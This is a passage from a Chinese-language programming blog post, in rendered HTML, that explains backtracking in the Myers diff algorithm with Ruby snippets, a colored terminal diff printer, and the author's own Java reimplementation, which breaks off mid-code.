class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></div>

<p>由上面得到最小的编辑数，在这之后需要做的就是回溯来找出最短路。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    |      0     1     2     3     4     5</span><br><span class="line">----+--------------------------------------</span><br><span class="line">    |</span><br><span class="line"> 4  |                              7</span><br><span class="line">    |</span><br><span class="line"> 3  |                        5</span><br><span class="line">    |</span><br><span class="line"> 2  |                  3           7</span><br><span class="line">    |</span><br><span class="line"> 1  |            1           5           7</span><br><span class="line">    |</span><br><span class="line"> 0  |      0           2           5</span><br><span class="line">    |</span><br><span class="line">-1  |            0           4           5</span><br><span class="line">    |</span><br><span class="line">-2  |                  2           4</span><br><span class="line">    |</span><br><span class="line">-3  |                        3</span><br></pre></td></tr></table></figure></div>

<p>现在开始回溯，首先知道最终的位置是 (x, y) &#x3D; (7, 6), 对应着 (d, k) &#x3D; (5, 1)，所以我们可以track back 到 (4, 0) 或 (4, 2):</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    |      0     1     2     3     4     5</span><br><span class="line">----+--------------------------------------</span><br><span class="line">    |</span><br><span class="line"> 4  |                              7</span><br><span class="line">    |</span><br><span class="line"> 3  |                        5</span><br><span class="line">    |</span><br><span class="line"> 2  |                  3         ( 7 )</span><br><span class="line">    |                                 \</span><br><span class="line"> 1  |            1           5         [ 7 ]</span><br><span class="line">    |</span><br><span class="line"> 0  |      0           2         ( 5 )</span><br><span class="line">    |</span><br><span class="line">-1  |            0           4           5</span><br><span class="line">    |</span><br><span class="line">-2  |                  2           4</span><br><span class="line">    |</span><br><span class="line">-3  |                        3</span><br></pre></td></tr></table></figure></div>

<p>可以看到 (d, k) &#x3D; (4, 2), 有着更高的 x &#x3D; 7, 也就是说 (7, 5) -&gt; (7, 6). 同样的 (d, k) &#x3D; (3, 1) or (3, 3)  后者的x并不大于 前者，因此取 (3, 1)， 也就是 (x, y) &#x3D; (5, 4) -&gt; (7, 5).</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    |      0     1     2     3     4     5</span><br><span class="line">----+--------------------------------------</span><br><span class="line">    |</span><br><span class="line"> 4  |                              7</span><br><span class="line">    |</span><br><span class="line"> 3  |                        5</span><br><span class="line">    |</span><br><span class="line"> 2  |                  3           7</span><br><span class="line">    |                     \     /     \</span><br><span class="line"> 1  |            1           5           7</span><br><span class="line">    |</span><br><span class="line"> 0  |      0           2           5</span><br><span class="line">    |</span><br><span class="line">-1  |            0           4           5</span><br><span class="line">    |</span><br><span class="line">-2  |                  2           4</span><br><span class="line">    |</span><br><span class="line">-3  |                        3</span><br></pre></td></tr></table></figure></div>

<p>到这一步的时候其实路径就已经出来了，前置地选择都是唯一的。所以最终得到的 (x, y) 路径为 <code>(0,0) -&gt; (1,0) -&gt; (3,1) -&gt; (5,4) -&gt; (7,5) -&gt; (7,6)</code>。 这几个点上也很好推算斜线移动，只要同时对 x–, y– 然后到一方值达到相同后，就可以知道移动的上一步是啥了。</p>
<p>之前只保存了 x 的最新值是不够的，这里需要微调下，我们创建一个数组 trace 用来在每次 d 增时保存 v 的快照，并最终返回这个数组。这也对应在上述的图中其实每轮 d 变就是一列 v copy。</p>
<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="code"><pre><span class="line">v     = <span class="title class_">Array</span>.new(<span class="number">2</span> * max + <span class="number">1</span>)</span><br><span class="line">v[<span class="number">1</span>]  = <span class="number">0</span></span><br><span class="line">trace = []</span><br><span class="line"></span><br><span class="line">(<span class="number">0</span> .. max).step <span class="keyword">do</span> |<span class="params">d</span>|</span><br><span class="line">  trace &lt;&lt; v.clone</span><br><span class="line"></span><br><span class="line">  (-d .. d).step(<span class="number">2</span>) <span class="keyword">do</span> |<span class="params">k</span>|</span><br><span class="line">    <span class="comment"># calculate the next move...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> trace <span class="keyword">if</span> x &gt;= n <span class="keyword">and</span> y &gt;= m</span><br></pre></td></tr></table></figure></div>

<p>这样 trace 就可以保存足够的信息用来按照前面所提到推演方式来推演实际的最佳路径【也就是对于每个 (d, k) 最佳的x】。</p>
<p>这样就可以构建一个方法，接受 shortest_edit function 和 最终点(x, y) 这俩参数，然后在每次移动前后把 (x, y) yield 出去。</p>
<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">backtrack</span></span><br><span class="line">  x, y = <span class="variable">@a</span>.size, <span class="variable">@b</span>.size</span><br><span class="line"></span><br><span class="line">  shortest_edit.each_with_index.reverse_each <span class="keyword">do</span> |<span class="params">v, d</span>|</span><br></pre></td></tr></table></figure></div>
<p>上面的 <code>each_with_index</code> 用来为 v 配上索引号(也就是d的值)，而<code>reverse_each</code> 就是反向遍历。在遍历时采用和 <code>shortest_edit</code> 一样的逻辑来整活，计算出 k的值，并推算出前一个 k的值, 进而通过 prev_k 找回对应的 prev_x 并算出 prev_y 的值.</p>
<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="code"><pre><span class="line">k = x - y</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> k == -d <span class="keyword">or</span> (k != d <span class="keyword">and</span> v[k - <span class="number">1</span>] &lt; v[k + <span class="number">1</span>])</span><br><span class="line">  prev_k = k + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  prev_k = k - <span class="number">1</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># calc prev_x and prev_y</span></span><br><span class="line">prev_x = v[prev_k]</span><br><span class="line">prev_y = prev_x - prev_k</span><br></pre></td></tr></table></figure></div>

<p>如果说当前的 prev_x 和 prev_y 同时小于 x， y，那么必然走过了斜线。因此开始除斜线，并把去除过程中每个经过的 x， y yield 出去。</p>
<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> x &gt; prev_x <span class="keyword">and</span> y &gt; prev_y</span><br><span class="line">        <span class="keyword">yield</span> x - <span class="number">1</span>, y - <span class="number">1</span>, x, y</span><br><span class="line">        x, y = x - <span class="number">1</span>, y - <span class="number">1</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></div>

<p>斜线除掉后的回退应该是一次单独的 x 或 y 增步进。但是考虑到边界值即 d 为0的时候，没有可以回退的 x， y，因此continue 掉。最后把获取到的prev值赋值给当前 x,y 然后开始新一层的循环，最终得到如下结果</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(7, 5) -&gt; (7, 6)</span><br><span class="line">(6, 4) -&gt; (7, 5)</span><br><span class="line">(5, 4) -&gt; (6, 4)</span><br><span class="line">(4, 3) -&gt; (5, 4)</span><br><span class="line">(3, 2) -&gt; (4, 3)</span><br><span class="line">(3, 1) -&gt; (3, 2)</span><br><span class="line">(2, 0) -&gt; (3, 1)</span><br><span class="line">(1, 0) -&gt; (2, 0)</span><br><span class="line">(0, 0) -&gt; (1, 0)</span><br></pre></td></tr></table></figure></div>

<p>到这一步就可以把前面的都粘合起来了，我们将提供一个这样的方法：这个方法接两个文本并把它们转换成两个 <code>list&lt;line&gt;</code> 后传给 <code>shortest_edit</code> 以此来通过 <code>backtrack</code> 来生成一系列 删除，增加，不变的 diff.</p>
<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">def</span> <span class="title function_">diff</span></span><br><span class="line">    diff = []</span><br><span class="line"></span><br><span class="line">    backtrack <span class="keyword">do</span> |<span class="params">prev_x, prev_y, x, y</span>|</span><br><span class="line">      a_line, b_line = <span class="variable">@a</span>[prev_x], <span class="variable">@b</span>[prev_y]</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> x == prev_x</span><br><span class="line">        diff.unshift(<span class="title class_">Diff::Edit</span>.new(<span class="symbol">:ins</span>, <span class="literal">nil</span>, b_line))</span><br><span class="line">      <span class="keyword">elsif</span> y == prev_y</span><br><span class="line">        diff.unshift(<span class="title class_">Diff::Edit</span>.new(<span class="symbol">:del</span>, a_line, <span class="literal">nil</span>))</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        diff.unshift(<span class="title class_">Diff::Edit</span>.new(<span class="symbol">:eql</span>, a_line, b_line))</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="string">``</span><span class="string">`    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">上述方法首先提供了一个 diff 数组用来在每次yield 时保存 diff line。如果 x 在两次变更中相等，那么就意味着是一次 y 增，也就是 b插入，同理 y同 x增 即 a删除，除此之外都是同行。这里也把 Diff.edit 简单说明下，就是一个简单的输出模块，方便日志审查。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>ruby</span><br><span class="line"><span class="keyword">module</span> <span class="title class_">Diff</span></span><br><span class="line">  <span class="title class_">Edit</span> = <span class="title class_">Struct</span>.new(<span class="symbol">:type</span>, <span class="symbol">:old_line</span>, <span class="symbol">:new_line</span>) <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">old_number</span></span><br><span class="line">      old_line ? old_line.number.to_s : <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">new_number</span></span><br><span class="line">      new_line ? new_line.number.to_s : <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">text</span></span><br><span class="line">      (old_line |<span class="params"></span>| new_line).text</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></div>

<p>然后我们就可以用 <code>Diff::Edit</code> objects 做一些实际的应用，比如terminal 上打红绿。 </p>
<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">module</span> <span class="title class_">Diff</span></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">Printer</span></span><br><span class="line"></span><br><span class="line">    <span class="variable constant_">TAGS</span> = &#123;<span class="symbol">eql:</span> <span class="string">&quot; &quot;</span>, <span class="symbol">del:</span> <span class="string">&quot;-&quot;</span>, <span class="symbol">ins:</span> <span class="string">&quot;+&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable constant_">COLORS</span> = &#123;</span><br><span class="line">      <span class="symbol">del:</span>     <span class="string">&quot;\e[31m&quot;</span>,</span><br><span class="line">      <span class="symbol">ins:</span>     <span class="string">&quot;\e[32m&quot;</span>,</span><br><span class="line">      <span class="symbol">default:</span> <span class="string">&quot;\e[39m&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable constant_">LINE_WIDTH</span> = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params"><span class="symbol">output:</span> <span class="variable">$stdout</span></span>)</span><br><span class="line">      <span class="variable">@output</span> = output</span><br><span class="line">      <span class="variable">@colors</span> = output.isatty ? <span class="variable constant_">COLORS</span> : &#123;&#125;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print</span>(<span class="params">diff</span>)</span><br><span class="line">      diff.each &#123; |<span class="params">edit</span>| print_edit(edit) &#125;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_edit</span>(<span class="params">edit</span>)</span><br><span class="line">      col   = <span class="variable">@colors</span>.fetch(edit.type, <span class="string">&quot;&quot;</span>)</span><br><span class="line">      reset = <span class="variable">@colors</span>.fetch(<span class="symbol">:default</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">      tag   = <span class="variable constant_">TAGS</span>[edit.type]</span><br><span class="line"></span><br><span class="line">      old_line = edit.old_number.rjust(<span class="variable constant_">LINE_WIDTH</span>, <span class="string">&quot; &quot;</span>)</span><br><span class="line">      new_line = edit.new_number.rjust(<span class="variable constant_">LINE_WIDTH</span>, <span class="string">&quot; &quot;</span>)</span><br><span class="line">      text     = edit.text.rstrip</span><br><span class="line"></span><br><span class="line">      <span class="variable">@output</span>.puts <span class="string">&quot;<span class="subst">#&#123;col&#125;</span><span class="subst">#&#123;tag&#125;</span> <span class="subst">#&#123;old_line&#125;</span> <span class="subst">#&#123;new_line&#125;</span>    <span class="subst">#&#123;text&#125;</span><span class="subst">#&#123;reset&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></div>

<p>大致会得到这样的回显：(+ 是绿色行， -是红色行，其他是白行)</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-    1         A</span><br><span class="line">-    2         B</span><br><span class="line">     3    1    C</span><br><span class="line">+         2    B</span><br><span class="line">     4    3    A</span><br><span class="line">     5    4    B</span><br><span class="line">-    6         B</span><br><span class="line">     7    5    A</span><br><span class="line">+         6    C</span><br></pre></td></tr></table></figure></div>

<p>到此一个简易的diff 就已经实现了，Blog 的作者提议是可以对此做进一步的改进，例如只显示已更改的区域，在它们周围保留一定数量的不变上下文，像git diff一样格式化它们之类的。 </p>
<p>此外尽管git diff并未显示每行的数字，但它确实在每个change节之前包含一个标头，其中包含该节的偏移量，并且需要行号来计算该行。 这意味着行号其实非常重要，通过这个行号求出的偏移量可以帮助git apply找到正确的位置来应用每个更改，这也意味着这个行号在git merge算法中有着很重要的作用。</p>
<p>作者用 ruby 写的，这里自己用 java 重写了一版，欢迎优化</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> club.qqtim.diff.algorithm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> club.qqtim.common.ConstantVal;</span><br><span class="line"><span class="keyword">import</span> club.qqtim.diff.LineObject;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Stack;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span>: MyersDiff</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> rezeros.github.io</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2021/2/19</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Version</span> 1.0.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyersDiff</span> <span class="keyword">implements</span> <span class="title class_">DiffAlgorithm</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * complexity of both time and space : O ((N + M)D)</span></span><br><span class="line"><span class="comment">     * k = x - y</span></span><br><span class="line"><span class="comment">     * 0 - 1 - 2 - 3 // x</span></span><br><span class="line"><span class="comment">     * |</span></span><br><span class="line"><span class="comment">     * 1</span></span><br><span class="line"><span class="comment">     * |</span></span><br><span class="line"><span class="comment">     * 2  // y</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;LineObject&gt; <span class="title function_">diff</span><span class="params">(List&lt;LineObject&gt; fromLineObjects, List&lt;LineObject&gt; targetLineObjects)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// init step</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">finalStep</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// we set from as x anxious</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">fromLineCount</span> <span class="operator">=</span> fromLineObjects.size();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// we set target as y anxious</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">targetLineCount</span> <span class="operator">=</span> targetLineObjects.size();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// sum of from and target lines count</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">totalLineCount</span> <span class="operator">=</span> targetLineCount + fromLineCount;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">vSize</span> <span class="operator">=</span> Math.max(fromLineCount, targetLineCount) * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// do snapshot for v while iterate step</span></span><br><span class="line">        <span class="type">int</span> [][] vList = <span class="keyword">new</span> <span class="title class_">int</span>[totalLineCount + <span class="number">1</span>][vSize];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// k can be zero, so plus one</span></span><br><span class="line">        <span class="comment">//todo optimize for minimize v.length</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span>[] v = <span class="keyword">new</span> <span class="title class_">int</span>[vSize];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set the previous start point</span></span><br><span class="line">        v[v.length / <span class="number">2</span> + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">foundShortest</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">step</span> <span class="operator">=</span> <span class="number">0</span>; step &lt;= totalLineCount; step++) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// little trick, java can not use negative number as array index</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">negativeStep</span> <span class="operator">=</span> v.length / <span class="number">2</span> - step;</span><br><span class="line">            <span class="type">int</span> <span class="variable">positiveStep</span> <span class="operator">=</span> v.length / <span class="number">2</span> + step;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> negativeStep; k &gt;= <span class="number">0</span> &amp;&amp; k &lt;= positiveStep; k += <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">kAimD</span> <span class="operator">=</span> k - v.length / <span class="number">2</span>;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">down</span> <span class="operator">=</span> (kAimD == -step || (kAimD != step &amp;&amp; v[k - <span class="number">1</span>] &lt; v[k + <span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> <span class="variable">xStart</span> <span class="operator">=</span> down? v[k + <span class="number">1</span>]: v[k - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> <span class="variable">xEnd</span> <span class="operator">=</span> down? xStart: xStart + <span class="number">1</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">yEnd</span> <span class="operator">=</span> xEnd - kAimD;</span><br><span class="line">                <span class="comment">// diagonal</span></span><br><span class="line">                <span class="keyword">while</span> ((<span class="number">0</span> &lt;= xEnd &amp;&amp; xEnd &lt; fromLineCount) &amp;&amp; (<span class="number">0</span> &lt;= yEnd &amp;&amp; yEnd &lt; targetLineCount)</span><br><span class="line">                        &amp;&amp; (fromLineObjects.get(xEnd).getLineContent().equals(targetLineObjects.get(yEnd).getLineContent())))&#123;</span><br><span class="line">                    xEnd++; yEnd++;</span><br><span class="line">                &#125;</span><br><span class="line">                v[k] = xEnd;</span><br><span class="line">                <span class="keyword">if</span> (xEnd &gt;= fromLineCount &amp;&amp; yEnd &gt;= targetLineCount) &#123;</span><br><span class="line">                    foundShortest = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// do snapshot for v</span></span><br><span class="line">            vList[step] = Arrays.copyOf(v, v.length);</span><br><span class="line">            <span class="keyword">if</span> (foundShortest) &#123;</span><br><span class="line">                finalStep = step;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;LineObject&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (foundShortest) &#123;</span><br><span class="line">            Stack&lt;Snake&gt; snakeStack = generateSnakes(fromLineCount, targetLineCount, vList, finalStep);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// the final step, let&#x27;s rock</span></span><br><span class="line">            <span class="type">SnakePoint</span> <span class="variable">realStartPoint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SnakePoint</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span>(!snakeStack.empty()) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Snake</span> <span class="variable">snake</span> <span class="operator">=</span> snakeStack.pop();</span><br><span class="line">                <span class="keyword">final</span> <span class="type">SnakePoint</span> <span class="variable">start</span> <span class="operator">=</span> snake.getStart();</span><br><span class="line">                <span class="keyword">final</span> <span class="type">SnakePoint</span> <span class="variable">middle</span> <span class="operator">=</span> snake.getMiddle();</span><br><span class="line">                <span class="keyword">final</span> <span class="type">SnakePoint</span> <span class="variable">end</span> <span class="operator">=</span> snake.getEnd();</span><br><span class="line"></span><br><span class="line">                result.addAll(compareSnakePoint(realStartPoint, start, fromLineObjects, targetLineObjects));</span><br><span class="line">                result.addAll(compareSnakePoint(start, middle, fromLineObjects, targetLineObjects));</span><br><span class="line">                result.addAll(compareSnakePoint(middle, end, fromLineObjects, targetLineObjects));</span><br><span class="line"></span><br><span class="line">                realStartPoint = end;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fromLineObjects.forEach(line -&gt; line.setAction(ConstantVal.MINUS));</span><br><span class="line">        targetLineObjects.forEach(line -&gt; line.setAction(ConstantVal.PLUS));</span><br><span class="line">        result.addAll(fromLineObjects);</span><br><span class="line">        result.addAll(targetLineObjects);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * let&#x27;s do backtrack to generate the shortest path</span></span><br><span class="line"><span class="comment">     * now vList has total record we need: every step the (k, x) val</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *    start(K-1) -- mid(K)</span></span><br><span class="line"><span class="comment">     *                         \</span></span><br><span class="line"><span class="comment">     *                          \</span></span><br><span class="line"><span class="comment">     *                           end</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Stack&lt;Snake&gt; <span class="title function_">generateSnakes</span><span class="params">(<span class="type">int</span> fromLineCount, <span class="type">int</span> targetLineCount, <span class="type">int</span>[][] vList, <span class="type">int</span> finalStep)</span> &#123;</span><br><span class="line"></span><br><span class="line">        Stack&lt;Snake&gt; snakeStack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">fromEndX</span> <span class="operator">=</span> fromLineCount;</span><br><span class="line">        <span class="type">int</span> <span class="variable">targetEndY</span> <span class="operator">=</span> targetLineCount;</span><br><span class="line">        <span class="comment">// step &gt;= 0 or (fromEndX &gt; 0  &amp;&amp; targetEndY&gt; 0)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">step</span> <span class="operator">=</span> finalStep; fromEndX &gt; <span class="number">0</span>  &amp;&amp; targetEndY &gt; <span class="number">0</span>; step--) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span>[] v = vList[step];</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">negativeStep</span> <span class="operator">=</span> v.length / <span class="number">2</span> - step;</span><br><span class="line">            <span class="type">int</span> <span class="variable">positiveStep</span> <span class="operator">=</span> v.length / <span class="number">2</span> + step;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> fromEndX - targetEndY;</span><br><span class="line">            <span class="type">int</span> <span class="variable">kIndex</span> <span class="operator">=</span> v.length / <span class="number">2</span> + k;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// set current k as end point</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">xEnd</span> <span class="operator">=</span> v[kIndex];</span><br><span class="line">            <span class="type">int</span> <span class="variable">yEnd</span> <span class="operator">=</span> xEnd - k;</span><br><span class="line"></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">down</span> <span class="operator">=</span> (k == negativeStep || (k != positiveStep &amp;&amp; v[kIndex - <span class="number">1</span>] &lt; v[kIndex + <span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">xStart</span> <span class="operator">=</span> v[down? kIndex + <span class="number">1</span>: kIndex - <span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">yStart</span> <span class="operator">=</span> xStart - (down? k + <span class="number">1</span>: k -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">xMid</span> <span class="operator">=</span> down? xStart: xStart + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">yMid</span> <span class="operator">=</span> xMid - k;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> <span class="type">Snake</span> <span class="variable">snake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Snake</span>();</span><br><span class="line">            snake.setStart(<span class="keyword">new</span> <span class="title class_">SnakePoint</span>(xStart, yStart));</span><br><span class="line">            snake.setMiddle(<span class="keyword">new</span> <span class="title class_">SnakePoint</span>(xMid, yMid));</span><br><span class="line">            snake.setEnd(<span class="keyword">new</span> <span class="title class_">SnakePoint</span>(xEnd, yEnd));</span><br><span class="line">            snakeStack.push(snake);</span><br><span class="line"></span><br><span class="line">            fromEndX = xStart;</span><br><span class="line">            targetEndY = yStart;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> snakeStack;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;LineObject&gt; <span class="title function_">compareSnakePoint</span></span><br><span class="line">            <span class="params">(SnakePoint from, SnakePoint end, List&lt;LineObject&gt; fromLineObjects, List&lt;LineObject&gt; targetLineObjects)</span> &#123;</span><br><span class="line">        <span class="comment">// mid equals end</span></span><br><span class="line">        <span class="keyword">if</span> (from.equals(end)) &#123;</span><br><span class="line">            <span class="keyword">return</span> Collections.emptyList();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        List&lt;LineObject&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// mid to end</span></span><br><span class="line">        <span class="keyword">if</span> (!from.getX().equals(end.getX()) &amp;&amp; !from.getY().equals(end.getY())) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">fromX</span> <span class="operator">=</span> from.getX(); fromX &lt; end.getX(); fromX++) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">LineObject</span> <span class="variable">lineObject</span> <span class="operator">=</span> fromLineObjects.get(fromX);</span><br><span class="line">                lineObject.setAction(ConstantVal.SYNC);</span><br><span class="line">                result.add(lineObject);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// start to mid</span></span><br><span class="line">            <span class="keyword">if</span> (!from.getX().equals(end.getX())) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">LineObject</span> <span class="variable">lineObject</span> <span class="operator">=</span> fromLineObjects.get(from.getX());</span><br><span class="line">                lineObject.setAction(ConstantVal.MINUS);</span><br><span class="line">                result.add(lineObject);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!from.getY().equals(end.getY())) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">LineObject</span> <span class="variable">lineObject</span> <span class="operator">=</span> targetLineObjects.get(from.getY());</span><br><span class="line">                lineObject.setAction(ConstantVal.PLUS);</span><br><span class="line">                result.add(lineObject);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * test method</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span 